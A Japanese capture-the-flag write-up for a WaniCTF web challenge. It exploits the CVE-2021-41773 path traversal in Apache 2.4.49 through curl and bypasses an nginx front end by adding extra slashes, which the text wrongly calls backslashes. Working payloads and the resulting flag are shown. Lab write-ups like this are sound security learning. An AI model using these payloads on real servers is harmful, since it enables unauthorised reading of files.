# traversal:Web:285pts
Webサーバーにロードバランサーをつけたよ！  
なんかWebサーバーのバージョンがアレらしいけど、秘密のファイル`/flag.txt`はそのままでいっか！  
[https://traversal.web.wanictf.org/](https://traversal.web.wanictf.org/)  
ヒント  
- いろいろ設定に違和感が...  
- [Burp Suite](https://portswigger.net/burp/communitydownload)を使うのがおすすめです  

[web-traversal.zip](web-traversal.zip)  

# Solution
秘密のファイル`/flag.txt`を取得すればよいようだ。  
アクセスしても`It works!`ページなのでどうしようもない。  
Webサーバのバージョンについて言及されているので、配布されたファイルを見る。  
```Dockerfile
FROM httpd:2.4.49

RUN echo "FAKE{This_is_fake_flag}" > /flag.txt

COPY httpd.conf /usr/local/apache2/conf/httpd.conf
```
Apache 2.4.49が動いているようだ。  
このバージョンにはCVE-2021-41773のパストラバーサルがある。  
ひとまずflag.txtを取得してみる。  
```bash
$ curl https://traversal.web.wanictf.org/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt
<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx/1.20.1</center>
</body>
</html>
```
400ではじかれている。  
nginxがロードバランサとして前にいることで、おかしくなっているようだ。  
仕組みについて調査すると「[ALB配下のApache HTTP Serverに対して脆弱性(CVE-2021-41733)の再現ができない理由をNGINXの挙動から考えてみた](https://dev.classmethod.jp/articles/apache-cve-alb-nginx/)」との記事を見つけることができた。  
バックスラッシュにより回避できるようだ。  
```bash
$ curl https://traversal.web.wanictf.org/cgi-bin///////.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt
FLAG{n61nx_w34k_c0nf16_m3r63_5l45h35}
```
flagが表示された。  

## FLAG{n61nx_w34k_c0nf16_m3r63_5l45h35}